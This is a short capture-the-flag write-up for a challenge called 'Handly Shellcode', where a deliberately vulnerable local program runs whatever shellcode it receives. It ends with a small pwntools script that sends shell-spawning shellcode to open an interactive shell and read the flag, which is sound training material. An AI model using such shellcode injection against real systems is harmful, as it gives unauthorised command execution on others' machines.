# Handly Shellcode

### 📄 Description
This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt?


### ⚙ How to run it
```bash
./vuln
```

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>

We have a program that asks us an shellcode.

If we provide to it an working shellcode, it will perform this shellcode.

There really wasn't a thinking process involved with the solution of this one, pwntools gives us a ready made shellcode for popping a shell using `shellcraft`.

```python
from pwn import *

context.binary = "./vuln"

p = process()
p.sendline(asm(shellcraft.sh()))
p.interactive()
```